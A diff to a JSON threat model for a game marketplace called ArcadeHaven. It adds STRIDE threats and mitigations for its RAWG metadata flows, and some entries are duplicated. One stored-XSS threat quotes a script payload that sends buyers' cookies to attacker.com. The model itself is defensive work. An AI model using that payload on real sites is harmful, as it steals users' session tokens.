+                  "mitigation": "Cache key for Game Details Responses must include both the RAWG game ID and the ArcadeHaven game ID to prevent cross-context cache hits; set an appropriate TTL (e.g. 24 hours for stable fields like title and genre, shorter for dynamic fields like Metacritic score); invalidate cache entries when a game is re-approved or metadata is manually overridden by an admin.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 229,
+                  "score": ""
+                },
+                {
+                  "id": "401e2805-cbe6-490b-a280-eeeb54ea6e9a",
+                  "title": "Concurrent Game Details Requests for the same game ID causing duplicate writes",
+                  "status": "Open",
+                  "severity": "Low",
+                  "type": "Denial of service",
+                  "description": "Two publishers independently link their games to the same popular RAWG game ID and both trigger Game Details Requests simultaneously. Both receive a Details Response and both attempt to write the fetched details to their respective game records at the same time. If the Game Details process is not idempotent, this may cause duplicate metadata records or race conditions in the write path.",
+                  "mitigation": "Game Details write operations are idempotent — writing the same details twice has the same effect as writing once; use an upsert (INSERT ... ON CONFLICT DO UPDATE) for metadata fields rather than separate INSERT/UPDATE; the write is scoped to the specific ArcadeHaven game ID so two different games linking to the same RAWG ID do not interfere with each other.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 230,
+                  "score": ""
+                }
+              ],
               "trustBoundaryIds": []
             },
             "labels": [
@@ -11712,7 +12245,8 @@
             "shape": "flow",
             "attrs": {
               "line": {
-                "stroke": "#333333",
+                "stroke": "red",
+                "strokeWidth": 2.5,
                 "targetMarker": {
                   "name": "block"
                 },
@@ -11733,13 +12267,97 @@
               "outOfScope": false,
               "isTrustBoundary": false,
               "reasonOutOfScope": "",
-              "hasOpenThreats": false,
+              "hasOpenThreats": true,
               "isBidirectional": false,
               "isEncrypted": false,
               "isPublicNetwork": false,
               "protocol": "",
-              "threats": [],
-              "trustBoundaryIds": []
+              "threats": [
+                {
+                  "id": "9271fee3-06e1-402c-8052-ee7b264447ca",
+                  "title": "Game Details Response age rating tampered — minor accessing adult content",
+                  "status": "Open",
+                  "severity": "Critical",
+                  "type": "Tampering",
+                  "description": "The Game Details Response for an 18+ game is intercepted and the age_rating field is changed from MATURE to EVERYONE. ArcadeHaven stores this forged rating and does not restrict the game's sale to minors. A minor purchases and accesses content they should be legally prohibited from viewing. This creates serious regulatory liability (PEGI/ESRB compliance) and potential legal consequences for the platform operator.",
+                  "mitigation": "Enforce TLS with certificate pinning or strict CA validation on all RAWG connections to prevent MitM tampering of the Details Response; treat all age rating data as potentially untrusted and verify it against a known enumeration of valid PEGI/ESRB values (reject unknown values rather than defaulting to the least restrictive rating); store the rating received at game creation time and require explicit admin re-approval if the rating changes on a re-fetch.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 225,
+                  "score": ""
+                },
+                {
+                  "id": "05ac801d-a15a-4edf-8b17-e6e4b7309f6e",
+                  "title": "Game Details Response contains developer/publisher PII from RAWG",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Information disclosure",
+                  "description": "RAWG's Game Details Response includes the name, website, and contact details of individual developers listed on the game. If ArcadeHaven stores and displays this data without checking whether the individuals have consented to having their personal data processed by a third party, it may violate GDPR Article 6 (lawful basis for processing) for that PII.",
+                  "mitigation": "Review which fields from the Game Details Response are stored and displayed; limit storage to non-personal fields (studio name, not individual developer names) unless a clear legitimate interest or consent basis exists; document RAWG as a third-party data source in the ArcadeHaven GDPR Record of Processing Activities; consider stripping individual-level PII from the Details Response before storage.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 226,
+                  "score": ""
+                },
+                {
+                  "id": "4e3d049c-c211-4fee-938a-abb6bc4cbe92",
+                  "title": "\tMalformed RAWG game ID in Game Details Request causing repeated 404 errors",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Denial of service",
+                  "description": "A publisher submits an invalid or non-existent RAWG game ID. The Game Details Request receives a 404 from RAWG. A retry mechanism without a backoff strategy immediately re-sends the request, repeatedly receiving 404 responses. If many publishers simultaneously submit invalid IDs, the flood of failing Game Details Requests consumes RAWG quota for invalid lookups and creates noise in the error monitoring system.",
+                  "mitigation": "Validate the RAWG game ID format before sending any Game Details Request (must be a positive integer); on a 404 response, mark the game's rawg_id as invalid in the Game Datastore and do not retry — surface a validation error to the publisher; exponential backoff only for transient errors (5xx), not for client errors (4xx) which should fail immediately.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 227,
+                  "score": ""
+                },
+                {
+                  "id": "502b957f-ca4b-4b10-8dd7-a324a66e6fb4",
+                  "title": "Game Details Response snapshot not stored at purchase time — rating change affects past buyers",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Tampering",
+                  "description": "A buyer purchases a game rated TEEN. RAWG later updates the game's rating to MATURE. ArcadeHaven re-fetches the Game Details and overwrites the stored rating. The order record now refers to a MATURE game even though the buyer consented to a TEEN-rated purchase — the stored evidence of what the buyer purchased no longer matches the current record, creating compliance and dispute resolution problems.",
+                  "mitigation": "Store a snapshot of the relevant Details Response fields (age_rating, content_descriptors, title) in the order_items record at the time of purchase — this captures what the buyer saw and consented to; the live game listing can be updated from new Details Responses but the historical order snapshot is immutable; display the at-purchase rating in order history and invoice.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 228,
+                  "score": ""
+                },
+                {
+                  "id": "971d61c2-807c-4c5a-868b-290f68d8fcac",
+                  "title": "Game Details Response cached insecurely — stale or misattributed details served",
+                  "status": "Open",
+                  "severity": "Low",
+                  "type": "Information disclosure",
+                  "description": "The Game Details Response is cached using the RAWG game ID as the cache key without a user or game context component. Two publishers request details for the same RAWG game ID at nearly the same time; the second publisher receives the cached response from the first request. While the data itself is the same, the cache entry may be inadvertently associated with the wrong publisher's game listing if the cache key does not include the ArcadeHaven game ID.",
+                  "mitigation": "Cache key for Game Details Responses must include both the RAWG game ID and the ArcadeHaven game ID to prevent cross-context cache hits; set an appropriate TTL (e.g. 24 hours for stable fields like title and genre, shorter for dynamic fields like Metacritic score); invalidate cache entries when a game is re-approved or metadata is manually overridden by an admin.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 229,
+                  "score": ""
+                },
+                {
+                  "id": "401e2805-cbe6-490b-a280-eeeb54ea6e9a",
+                  "title": "Concurrent Game Details Requests for the same game ID causing duplicate writes",
+                  "status": "Open",
+                  "severity": "Low",
+                  "type": "Denial of service",
+                  "description": "Two publishers independently link their games to the same popular RAWG game ID and both trigger Game Details Requests simultaneously. Both receive a Details Response and both attempt to write the fetched details to their respective game records at the same time. If the Game Details process is not idempotent, this may cause duplicate metadata records or race conditions in the write path.",
+                  "mitigation": "Game Details write operations are idempotent — writing the same details twice has the same effect as writing once; use an upsert (INSERT ... ON CONFLICT DO UPDATE) for metadata fields rather than separate INSERT/UPDATE; the write is scoped to the specific ArcadeHaven game ID so two different games linking to the same RAWG ID do not interfere with each other.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 230,
+                  "score": ""
+                }
+              ],
+              "trustBoundaryIds": [],
+              "threatFrequency": {
+                "tampering": 2,
+                "informationDisclosure": 2,
+                "denialOfService": 2
+              }
             },
             "labels": [
               "Game Metadata\nRequest"
@@ -11764,7 +12382,8 @@
             "shape": "flow",
             "attrs": {
               "line": {
-                "stroke": "#333333",
+                "stroke": "red",
+                "strokeWidth": 2.5,
                 "targetMarker": {
                   "name": "block"
                 },
@@ -11785,13 +12404,97 @@
               "outOfScope": false,
               "isTrustBoundary": false,
               "reasonOutOfScope": "",
-              "hasOpenThreats": false,
+              "hasOpenThreats": true,
               "isBidirectional": false,
               "isEncrypted": false,
               "isPublicNetwork": false,
               "protocol": "",
-              "threats": [],
-              "trustBoundaryIds": []
+              "threats": [
+                {
+                  "id": "ce3e9cb2-1d8e-43c2-8a73-aa0c16624942",
+                  "title": "Metadata Response image URLs pointing to malicious or inappropriate content",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Tampering",
+                  "description": "The Game Metadata Response includes screenshot URLs: https://cdn.rawg.io/screenshots/game123.jpg. An attacker who controls a spoofed RAWG response substitutes URLs pointing to malware downloads or inappropriate imagery. If ArcadeHaven serves these URLs directly to buyers without re-hosting the images, buyers are sent to attacker-controlled content — and the URLs may circumvent ArcadeHaven's content policy.",
+                  "mitigation": "Never serve raw external URLs from the Metadata Response directly to buyers; the Game Metadata process must download and re-host all images through the Game Images Handler (validated, UUID-renamed, magic-byte checked); if re-hosting is not immediately feasible, validate all image URLs against an allowlist of trusted RAWG CDN domains before serving; set a strict Content-Security-Policy img-src directive.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 219,
+                  "score": ""
+                },
+                {
+                  "id": "b89b5d4d-4c40-440e-92d2-af8f72cf45d0",
+                  "title": "RAWG API key exposed in Game Metadata Request",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Information disclosure",
+                  "description": "The Game Metadata Request URL includes the API key as a query parameter. This URL is logged by the outbound HTTP client in the application log, by any APM tracing tool (e.g. Jaeger, Zipkin) recording the outbound span, and potentially by RAWG's own server logs. Any party with access to these logs holds a valid ArcadeHaven RAWG API key.",
+                  "mitigation": " tool (e.g. Jaeger, Zipkin) recording the outbound span, and potentially by RAWG's own server logs. Any party with access to these logs holds a valid ArcadeHaven RAWG API key.\tSame mitigation as Flow 1: inject API key as an HTTP header if supported; if a query parameter is unavoidable, configure all logging frameworks and APM tools to mask the key parameter; store the key in secrets manager; rotate immediately on suspected exposure; monitor RAWG usage for anomalous consumption patterns.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 220,
+                  "score": ""
+                },
+                {
+                  "id": "90f14aa4-5fe8-45f9-9c59-3ab7ecb9db37",
+                  "title": "Metadata refresh loop — repeated Metadata Requests exhausting RAWG quota",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Denial of service",
+                  "description": "A bug in the Game Metadata refresh scheduler triggers repeated Game Metadata Requests for the same game ID every few seconds (e.g. due to a missing last_fetched timestamp check or an infinite retry loop on failure). RAWG quota is exhausted within minutes, blocking metadata enrichment for all publishers and breaking the game creation workflow across the entire platform.",
+                  "mitigation": "Enforce a minimum refresh interval per game (e.g. 24 hours) enforced by a last_fetched timestamp stored in the Game Datastore; the scheduler checks this timestamp before issuing any Metadata Request — if last_fetched is within the interval, no request is sent; dead-letter queue for failed refresh jobs with exponential backoff (1min → 5min → 30min → 24h); alert on metadata request rate exceeding a configured daily budget.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 221,
+                  "score": ""
+                },
+                {
+                  "id": "3b123ce4-3c81-482c-a286-50ba1c9167e9",
+                  "title": "Metadata Response carries stored XSS payload — persisted to Game Datastore and executed in all buyers' browsers",
+                  "status": "Open",
+                  "severity": "Critical",
+                  "type": "Tampering",
+                  "description": "A compromised or spoofed RAWG endpoint returns a Game Metadata Response where the description field contains: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>. The Game Metadata process stores this unsanitised string in the Game Datastore. Every buyer who views the game's page on ArcadeHaven executes the script, leaking their session tokens to the attacker — this is a stored XSS affecting the entire platform's user base.",
+                  "mitigation": "All string fields in the Game Metadata Response must be HTML-sanitised using OWASP Java HTML Sanitizer before storage — this is non-negotiable for any externally sourced content; define a strict HTML allowlist (bold, italic, paragraphs, lists only — no script, no style, no iframe, no event attributes); apply output encoding at the frontend render layer as a second line of defence; enforce a Content-Security-Policy header with script-src 'self'.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 222,
+                  "score": ""
+                },
+                {
+                  "id": "8de7ff08-f057-47c6-bca6-7f0642328b19",
+                  "title": "\tMetadata Response contains RAWG-embedded tracking elements",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Information disclosure",
+                  "description": "The Game Metadata Response description HTML includes third-party tracking pixels or analytics iframes embedded by RAWG or the game's publisher on RAWG's platform. If stored and rendered on ArcadeHaven without sanitisation, these tracking elements report ArcadeHaven buyers' browsing behaviour (which games they view, how long they spend on each page) to third-party analytics providers without the buyer's knowledge or consent — a GDPR violation.",
+                  "mitigation": "HTML sanitisation allowlist must explicitly block all iframe, img with tracking domains, script, and pixel-style elements; re-hosting images removes tracking pixels; apply the sanitisation rule that any external resource reference in the Metadata Response is stripped before storage; include RAWG data processing in the ArcadeHaven GDPR data mapping documentation.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 223,
+                  "score": ""
+                },
+                {
+                  "id": "0658d350-887d-4ed4-a519-202f1e09e156",
+                  "title": "\tLarge Metadata Response causing synchronous processing stall",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Denial of service",
+                  "description": "A game with hundreds of screenshots, a very long description, and extensive platform/genre tags produces a Metadata Response of several megabytes. The Game Metadata process deserialises and processes this synchronously within a web request thread, blocking the thread for several seconds and degrading responsiveness for all concurrent users during bulk metadata imports.",
+                  "mitigation": "Process Game Metadata Responses asynchronously via a background job / message queue — game creation completes immediately, metadata enrichment happens out-of-band; limit the number of screenshots stored per game (e.g. max 10); truncate descriptions at a maximum character limit before storage; streaming JSON parsing for large responses.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 224,
+                  "score": ""
+                }
+              ],
+              "trustBoundaryIds": [],
+              "threatFrequency": {
+                "tampering": 2,
+                "informationDisclosure": 2,
+                "denialOfService": 2
+              }
             },
             "labels": [
               "Game Details\nRequest"
@@ -11816,7 +12519,8 @@
             "shape": "flow",
             "attrs": {
               "line": {
-                "stroke": "#333333",
+                "stroke": "red",
+                "strokeWidth": 2.5,
                 "targetMarker": {
                   "name": "block"
                 },
@@ -11837,12 +12541,91 @@
               "outOfScope": false,
               "isTrustBoundary": false,
               "reasonOutOfScope": "",
-              "hasOpenThreats": false,
+              "hasOpenThreats": true,
               "isBidirectional": false,
               "isEncrypted": false,
               "isPublicNetwork": false,
               "protocol": "",
-              "threats": [],
+              "threats": [
+                {
+                  "id": "ce3e9cb2-1d8e-43c2-8a73-aa0c16624942",
+                  "title": "Metadata Response image URLs pointing to malicious or inappropriate content",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Tampering",
+                  "description": "The Game Metadata Response includes screenshot URLs: https://cdn.rawg.io/screenshots/game123.jpg. An attacker who controls a spoofed RAWG response substitutes URLs pointing to malware downloads or inappropriate imagery. If ArcadeHaven serves these URLs directly to buyers without re-hosting the images, buyers are sent to attacker-controlled content — and the URLs may circumvent ArcadeHaven's content policy.",
+                  "mitigation": "Never serve raw external URLs from the Metadata Response directly to buyers; the Game Metadata process must download and re-host all images through the Game Images Handler (validated, UUID-renamed, magic-byte checked); if re-hosting is not immediately feasible, validate all image URLs against an allowlist of trusted RAWG CDN domains before serving; set a strict Content-Security-Policy img-src directive.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 219,
+                  "score": ""
+                },
+                {
+                  "id": "b89b5d4d-4c40-440e-92d2-af8f72cf45d0",
+                  "title": "RAWG API key exposed in Game Metadata Request",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Information disclosure",
+                  "description": "The Game Metadata Request URL includes the API key as a query parameter. This URL is logged by the outbound HTTP client in the application log, by any APM tracing tool (e.g. Jaeger, Zipkin) recording the outbound span, and potentially by RAWG's own server logs. Any party with access to these logs holds a valid ArcadeHaven RAWG API key.",
+                  "mitigation": " tool (e.g. Jaeger, Zipkin) recording the outbound span, and potentially by RAWG's own server logs. Any party with access to these logs holds a valid ArcadeHaven RAWG API key.\tSame mitigation as Flow 1: inject API key as an HTTP header if supported; if a query parameter is unavoidable, configure all logging frameworks and APM tools to mask the key parameter; store the key in secrets manager; rotate immediately on suspected exposure; monitor RAWG usage for anomalous consumption patterns.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 220,
+                  "score": ""
+                },
+                {
+                  "id": "90f14aa4-5fe8-45f9-9c59-3ab7ecb9db37",
+                  "title": "Metadata refresh loop — repeated Metadata Requests exhausting RAWG quota",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Denial of service",
+                  "description": "A bug in the Game Metadata refresh scheduler triggers repeated Game Metadata Requests for the same game ID every few seconds (e.g. due to a missing last_fetched timestamp check or an infinite retry loop on failure). RAWG quota is exhausted within minutes, blocking metadata enrichment for all publishers and breaking the game creation workflow across the entire platform.",
+                  "mitigation": "Enforce a minimum refresh interval per game (e.g. 24 hours) enforced by a last_fetched timestamp stored in the Game Datastore; the scheduler checks this timestamp before issuing any Metadata Request — if last_fetched is within the interval, no request is sent; dead-letter queue for failed refresh jobs with exponential backoff (1min → 5min → 30min → 24h); alert on metadata request rate exceeding a configured daily budget.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 221,
+                  "score": ""
+                },
+                {
+                  "id": "3b123ce4-3c81-482c-a286-50ba1c9167e9",
+                  "title": "Metadata Response carries stored XSS payload — persisted to Game Datastore and executed in all buyers' browsers",
+                  "status": "Open",
+                  "severity": "Critical",
+                  "type": "Tampering",
+                  "description": "A compromised or spoofed RAWG endpoint returns a Game Metadata Response where the description field contains: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>. The Game Metadata process stores this unsanitised string in the Game Datastore. Every buyer who views the game's page on ArcadeHaven executes the script, leaking their session tokens to the attacker — this is a stored XSS affecting the entire platform's user base.",
+                  "mitigation": "All string fields in the Game Metadata Response must be HTML-sanitised using OWASP Java HTML Sanitizer before storage — this is non-negotiable for any externally sourced content; define a strict HTML allowlist (bold, italic, paragraphs, lists only — no script, no style, no iframe, no event attributes); apply output encoding at the frontend render layer as a second line of defence; enforce a Content-Security-Policy header with script-src 'self'.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 222,
+                  "score": ""
+                },
+                {
+                  "id": "8de7ff08-f057-47c6-bca6-7f0642328b19",
+                  "title": "\tMetadata Response contains RAWG-embedded tracking elements",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Information disclosure",
+                  "description": "The Game Metadata Response description HTML includes third-party tracking pixels or analytics iframes embedded by RAWG or the game's publisher on RAWG's platform. If stored and rendered on ArcadeHaven without sanitisation, these tracking elements report ArcadeHaven buyers' browsing behaviour (which games they view, how long they spend on each page) to third-party analytics providers without the buyer's knowledge or consent — a GDPR violation.",
+                  "mitigation": "HTML sanitisation allowlist must explicitly block all iframe, img with tracking domains, script, and pixel-style elements; re-hosting images removes tracking pixels; apply the sanitisation rule that any external resource reference in the Metadata Response is stripped before storage; include RAWG data processing in the ArcadeHaven GDPR data mapping documentation.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 223,
+                  "score": ""
+                },
+                {
+                  "id": "0658d350-887d-4ed4-a519-202f1e09e156",
+                  "title": "\tLarge Metadata Response causing synchronous processing stall",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Denial of service",
+                  "description": "A game with hundreds of screenshots, a very long description, and extensive platform/genre tags produces a Metadata Response of several megabytes. The Game Metadata process deserialises and processes this synchronously within a web request thread, blocking the thread for several seconds and degrading responsiveness for all concurrent users during bulk metadata imports.",
+                  "mitigation": "Process Game Metadata Responses asynchronously via a background job / message queue — game creation completes immediately, metadata enrichment happens out-of-band; limit the number of screenshots stored per game (e.g. max 10); truncate descriptions at a maximum character limit before storage; streaming JSON parsing for large responses.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 224,
+                  "score": ""
+                }
+              ],
               "trustBoundaryIds": []
             },
             "labels": [
@@ -11997,130 +12780,6 @@
           },
           {
             "position": {
-              "x": 505,
-              "y": 125
-            },
-            "size": {
-              "width": 120,
-              "height": 60
-            },
-            "attrs": {
-              "text": {
-                "text": "Database"
-              },
-              "topLine": {
-                "strokeWidth": 1.5,
-                "strokeDasharray": null
-              },
-              "bottomLine": {
-                "strokeWidth": 1.5,
-                "strokeDasharray": null
-              }
-            },
-            "visible": true,
-            "shape": "store",
-            "zIndex": 3,
-            "ports": {
-              "groups": {
-                "top": {
-                  "position": "top",
-                  "attrs": {
-                    "circle": {
-                      "r": 4,
-                      "magnet": true,
-                      "stroke": "#5F95FF",
-                      "strokeWidth": 1,
-                      "fill": "#fff",
-                      "style": {
-                        "visibility": "hidden"
-                      }
-                    }
-                  }
-                },
-                "right": {
-                  "position": "right",
-                  "attrs": {
-                    "circle": {
-                      "r": 4,
-                      "magnet": true,
-                      "stroke": "#5F95FF",
-                      "strokeWidth": 1,
-                      "fill": "#fff",
-                      "style": {
-                        "visibility": "hidden"
-                      }
-                    }
-                  }
-                },
-                "bottom": {
-                  "position": "bottom",
-                  "attrs": {
-                    "circle": {
-                      "r": 4,
-                      "magnet": true,
-                      "stroke": "#5F95FF",
-                      "strokeWidth": 1,
-                      "fill": "#fff",
-                      "style": {
-                        "visibility": "hidden"
-                      }
-                    }
-                  }
-                },
-                "left": {
-                  "position": "left",
-                  "attrs": {
-                    "circle": {
-                      "r": 4,
-                      "magnet": true,
-                      "stroke": "#5F95FF",
-                      "strokeWidth": 1,
-                      "fill": "#fff",
-                      "style": {
-                        "visibility": "hidden"
-                      }
-                    }
-                  }
-                }
-              },
-              "items": [
-                {
-                  "group": "top",
-                  "id": "d8bb928d-6aee-4eba-bdce-5af5759b81a9"
-                },
-                {
-                  "group": "right",
-                  "id": "4b245edd-581f-4a07-a1d2-2afc41203398"
-                },
-                {
-                  "group": "bottom",
-                  "id": "f521747f-525f-4866-a41c-13a89dccdb02"
-                },
-                {
-                  "group": "left",
-                  "id": "7a19a835-3f6c-4fa5-9a49-d58a2c470c10"
-                }
-              ]
-            },
-            "id": "3dc4f0aa-eab0-43a2-b352-6e90dc9f72c1",
-            "data": {
-              "type": "tm.Store",
-              "name": "Database",
-              "description": "",
-              "outOfScope": false,
-              "isTrustBoundary": false,
-              "reasonOutOfScope": "",
-              "hasOpenThreats": false,
-              "isALog": false,
-              "isEncrypted": false,
-              "isSigned": false,
-              "storesCredentials": false,
-              "storesInventory": false,
-              "threats": []
-            }
-          },
-          {
-            "position": {
               "x": 90,
               "y": 430
             },
@@ -12241,8 +12900,8 @@
           },
           {
             "position": {
-              "x": 500,
-              "y": 430
+              "x": 525,
+              "y": 420
             },
             "size": {
               "width": 100,
@@ -12361,7 +13020,7 @@
           },
           {
             "position": {
-              "x": 860,
+              "x": 1050,
               "y": 430
             },
             "size": {
@@ -12373,8 +13032,8 @@
                 "text": "RAWG\nAPI"
               },
               "body": {
-                "stroke": "#333333",
-                "strokeWidth": 1.5,
+                "stroke": "red",
+                "strokeWidth": 2.5,
                 "strokeDasharray": null
               }
             },
@@ -12471,12 +13130,39 @@
               "outOfScope": false,
               "isTrustBoundary": false,
               "reasonOutOfScope": "",
-              "hasOpenThreats": false,
+              "hasOpenThreats": true,
               "handlesCardPayment": false,
               "handlesGoodsOrServices": false,
               "isWebApplication": false,
               "privilegeLevel": "",
-              "threats": []
+              "threats": [
+                {
+                  "id": "2bf9fcf2-12f3-46f3-9dfe-6815571f4e4b",
+                  "title": "Spoofed RAWG endpoint (DNS/MitM)",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Spoofing",
+                  "description": "DNS poisoning redirects rawg.io calls to a malicious server returning crafted game metadata containing malicious URLs or scripts.",
+                  "mitigation": "Pin RAWG base URL; enforce TLS certificate validation; treat all RAWG data as untrusted input regardless of source.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 76,
+                  "score": ""
+                },
+                {
+                  "id": "5f8b9f8d-67c4-4804-98af-bf86fb2d8827",
+                  "title": "No record of what external data was consumed",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Repudiation",
+                  "description": "A bad game description sourced from RAWG causes a compliance incident. No log exists of what version of the RAWG response was ingested at what time.",
+                  "mitigation": "Log raw RAWG responses with timestamp and request hash before processing; store a digest of consumed metadata in the Game record.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 77,
+                  "score": ""
+                }
+              ]
             }
           },
           {
@@ -12596,6 +13282,130 @@
               "handlesGoodsOrServices": false,
               "isWebApplication": false,
               "privilegeLevel": "",
+              "threats": []
+            }
+          },
+          {
+            "position": {
+              "x": 505,
+              "y": 125
+            },
+            "size": {
+              "width": 120,
+              "height": 60
+            },
+            "attrs": {
+              "text": {
+                "text": "Database"
+              },
+              "topLine": {
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              },
+              "bottomLine": {
+                "strokeWidth": 1.5,
+                "strokeDasharray": null
+              }
+            },
+            "visible": true,
+            "shape": "store",
+            "zIndex": 3,
+            "ports": {
+              "groups": {
+                "top": {
+                  "position": "top",
+                  "attrs": {
+                    "circle": {
+                      "r": 4,
+                      "magnet": true,
+                      "stroke": "#5F95FF",
+                      "strokeWidth": 1,
+                      "fill": "#fff",
+                      "style": {
+                        "visibility": "hidden"
+                      }
+                    }
+                  }
+                },
+                "right": {
+                  "position": "right",
+                  "attrs": {
+                    "circle": {
+                      "r": 4,
+                      "magnet": true,
+                      "stroke": "#5F95FF",
+                      "strokeWidth": 1,
+                      "fill": "#fff",
+                      "style": {
+                        "visibility": "hidden"
+                      }
+                    }
+                  }
+                },
+                "bottom": {
+                  "position": "bottom",
+                  "attrs": {
+                    "circle": {
+                      "r": 4,
+                      "magnet": true,
+                      "stroke": "#5F95FF",
+                      "strokeWidth": 1,
+                      "fill": "#fff",
+                      "style": {
+                        "visibility": "hidden"
+                      }
+                    }
+                  }
+                },
+                "left": {
+                  "position": "left",
+                  "attrs": {
+                    "circle": {
+                      "r": 4,
+                      "magnet": true,
+                      "stroke": "#5F95FF",
+                      "strokeWidth": 1,
+                      "fill": "#fff",
+                      "style": {
+                        "visibility": "hidden"
+                      }
+                    }
+                  }
+                }
+              },
+              "items": [
+                {
+                  "group": "top",
+                  "id": "d8bb928d-6aee-4eba-bdce-5af5759b81a9"
+                },
+                {
+                  "group": "right",
+                  "id": "4b245edd-581f-4a07-a1d2-2afc41203398"
+                },
+                {
+                  "group": "bottom",
+                  "id": "f521747f-525f-4866-a41c-13a89dccdb02"
+                },
+                {
+                  "group": "left",
+                  "id": "7a19a835-3f6c-4fa5-9a49-d58a2c470c10"
+                }
+              ]
+            },
+            "id": "3dc4f0aa-eab0-43a2-b352-6e90dc9f72c1",
+            "data": {
+              "type": "tm.Store",
+              "name": "Database",
+              "description": "",
+              "outOfScope": false,
+              "isTrustBoundary": false,
+              "reasonOutOfScope": "",
+              "hasOpenThreats": false,
+              "isALog": false,
+              "isEncrypted": false,
+              "isSigned": false,
+              "storesCredentials": false,
+              "storesInventory": false,
               "threats": []
             }
           },
@@ -12854,8 +13664,16 @@
             },
             "vertices": [
               {
-                "x": 800,
-                "y": 480
+                "x": 910,
+                "y": 390
+              },
+              {
+                "x": 960,
+                "y": 450
+              },
+              {
+                "x": 920,
+                "y": 570
               }
             ]
           },
@@ -13717,6 +14535,6 @@
     ],
     "diagramTop": 7,
     "reviewer": "Diogo Sousa & Diogo Pereira",
-    "threatTop": 193
+    "threatTop": 230
   }
 }
